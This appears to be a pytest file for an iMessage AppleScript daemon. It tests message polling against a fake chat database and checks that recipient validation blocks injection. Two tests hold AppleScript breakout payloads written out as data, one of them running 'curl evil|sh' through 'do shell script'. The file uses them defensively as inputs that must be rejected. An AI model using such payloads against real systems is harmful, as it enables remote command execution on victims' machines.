"""Tests for iMessage AppleScript daemon."""

from __future__ import annotations

import sqlite3
from pathlib import Path


def _create_fake_chat_db(db_path: Path) -> None:
    conn = sqlite3.connect(str(db_path))
    conn.executescript("""
        CREATE TABLE handle (ROWID INTEGER PRIMARY KEY, id TEXT);
        CREATE TABLE chat (
            ROWID INTEGER PRIMARY KEY,
            chat_identifier TEXT, display_name TEXT
        );
        CREATE TABLE chat_message_join (
            chat_id INTEGER, message_id INTEGER
        );
        CREATE TABLE message (
            ROWID INTEGER PRIMARY KEY, text TEXT,
            handle_id INTEGER, date INTEGER, is_from_me INTEGER
        );
    """)
    conn.execute("INSERT INTO handle VALUES (1, '+15551234567')")
    conn.execute("INSERT INTO chat VALUES (1, '+15551234567', 'Test Chat')")
    conn.execute("INSERT INTO chat_message_join VALUES (1, 1)")
    conn.execute(
        "INSERT INTO message VALUES (1, 'Hello agent', 1, 700000000000000000, 0)"
    )
    conn.commit()
    conn.close()


def test_poll_new_messages(tmp_path: Path) -> None:
    from openjarvis.channels.imessage_daemon import poll_new_messages

    db_path = tmp_path / "chat.db"
    _create_fake_chat_db(db_path)
    messages = poll_new_messages(
        db_path=str(db_path),
        last_rowid=0,
        chat_identifier="+15551234567",
    )
    assert len(messages) == 1
    assert messages[0]["text"] == "Hello agent"
    assert messages[0]["rowid"] == 1


def test_poll_skips_old_messages(tmp_path: Path) -> None:
    from openjarvis.channels.imessage_daemon import poll_new_messages

    db_path = tmp_path / "chat.db"
    _create_fake_chat_db(db_path)
    messages = poll_new_messages(
        db_path=str(db_path),
        last_rowid=1,
        chat_identifier="+15551234567",
    )
    assert len(messages) == 0


def test_poll_filters_by_chat(tmp_path: Path) -> None:
    from openjarvis.channels.imessage_daemon import poll_new_messages

    db_path = tmp_path / "chat.db"
    _create_fake_chat_db(db_path)
    messages = poll_new_messages(
        db_path=str(db_path),
        last_rowid=0,
        chat_identifier="+15559999999",
    )
    assert len(messages) == 0


def test_poll_skips_own_messages(tmp_path: Path) -> None:
    from openjarvis.channels.imessage_daemon import poll_new_messages

    db_path = tmp_path / "chat.db"
    conn = sqlite3.connect(str(db_path))
    conn.executescript("""
        CREATE TABLE handle (ROWID INTEGER PRIMARY KEY, id TEXT);
        CREATE TABLE chat (
            ROWID INTEGER PRIMARY KEY,
            chat_identifier TEXT, display_name TEXT
        );
        CREATE TABLE chat_message_join (
            chat_id INTEGER, message_id INTEGER
        );
        CREATE TABLE message (
            ROWID INTEGER PRIMARY KEY, text TEXT,
            handle_id INTEGER, date INTEGER, is_from_me INTEGER
        );
    """)
    conn.execute("INSERT INTO handle VALUES (1, '+15551234567')")
    conn.execute("INSERT INTO chat VALUES (1, '+15551234567', 'Test')")
    conn.execute("INSERT INTO chat_message_join VALUES (1, 1)")
    conn.execute(
        "INSERT INTO message VALUES (1, 'My own msg', 1, 700000000000000000, 1)"
    )
    conn.commit()
    conn.close()
    messages = poll_new_messages(
        db_path=str(db_path),
        last_rowid=0,
        chat_identifier="+15551234567",
    )
    assert len(messages) == 0


def test_is_valid_imessage_recipient() -> None:
    from openjarvis.channels.imessage_daemon import is_valid_imessage_recipient

    # Legitimate handles.
    assert is_valid_imessage_recipient("+15551234567")
    assert is_valid_imessage_recipient("5551234567")
    assert is_valid_imessage_recipient("alice@example.com")
    assert is_valid_imessage_recipient("bob.smith+tag@mail.co.uk")
    # AppleScript breakout / malformed handles must be rejected.
    assert not is_valid_imessage_recipient(
        'x" of targetService\ndo shell script "id"\n--'
    )
    assert not is_valid_imessage_recipient('a@b.com" & (do shell script "id")')
    assert not is_valid_imessage_recipient("")
    assert not is_valid_imessage_recipient("has space")


def test_send_imessage_rejects_injection_recipient(monkeypatch) -> None:
    """An attacker-influenced recipient must never reach ``osascript`` —
    regression for AppleScript/shell command injection."""
    import openjarvis.channels.imessage_daemon as d

    def _fail_run(*args, **kwargs):
        raise AssertionError("osascript must not run for an invalid recipient")

    monkeypatch.setattr(d.subprocess, "run", _fail_run)

    payload = (
        '+1" of targetService\ndo shell script "curl evil|sh"\nset z to participant "x'
    )
    assert d.send_imessage(payload, "hello") is False


def test_send_imessage_escapes_and_addresses_valid_recipient(monkeypatch) -> None:
    import openjarvis.channels.imessage_daemon as d

    captured: dict = {}

    class _Result:
        returncode = 0
        stderr = ""

    def _fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        return _Result()

    monkeypatch.setattr(d.subprocess, "run", _fake_run)

    assert d.send_imessage("+15551234567", 'hi "there"') is True
    script = captured["cmd"][2]
    # Recipient is the validated handle; message body has its quotes escaped.
    assert 'participant "+15551234567"' in script
    assert '\\"there\\"' in script
